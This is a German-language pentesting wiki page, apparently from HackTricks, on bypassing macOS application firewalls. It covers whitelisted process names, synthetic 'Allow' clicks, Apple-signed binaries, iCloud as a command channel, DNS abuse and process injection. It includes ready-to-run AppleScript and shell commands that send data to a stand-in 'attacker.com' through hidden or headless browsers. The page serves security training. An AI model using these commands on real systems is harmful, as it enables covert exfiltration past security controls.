# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Gefundene Techniken

Die folgenden Techniken wurden in einigen macOS-Firewall-Apps als funktionierend festgestellt.

### Missbrauch von Whitelist-Namen

- Zum Beispiel das Malware mit Namen bekannter macOS-Prozesse wie **`launchd`** aufzurufen.

### Synthetischer Klick

- Wenn die Firewall den Benutzer um Erlaubnis bittet, lasse die Malware **auf Erlauben klicken**.

### **Verwendung von Apple-signierten Binärdateien**

- Wie **`curl`**, aber auch andere wie **`whois`**.

### Bekannte Apple-Domains

Die Firewall könnte Verbindungen zu bekannten Apple-Domains wie **`apple.com`** oder **`icloud.com`** erlauben. Und iCloud könnte als C2 verwendet werden.

### Generischer Bypass

Einige Ideen, um zu versuchen, Firewalls zu umgehen.

### Überprüfen des erlaubten Verkehrs

Das Wissen um den erlaubten Verkehr wird Ihnen helfen, potenziell auf die Whitelist gesetzte Domains oder welche Anwendungen ihnen Zugriff gewährt wird, zu identifizieren.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Missbrauch von DNS

DNS-Auflösungen erfolgen über die **`mdnsreponder`** signierte Anwendung, die wahrscheinlich berechtigt ist, DNS-Server zu kontaktieren.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Über Browser-Apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Durch Prozessinjektionen

Wenn Sie **Code in einen Prozess injizieren** können, der berechtigt ist, eine Verbindung zu einem beliebigen Server herzustellen, könnten Sie die Firewall-Schutzmaßnahmen umgehen:

{{#ref}}
macos-proces-abuse/
{{#endref}}

## Referenzen

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
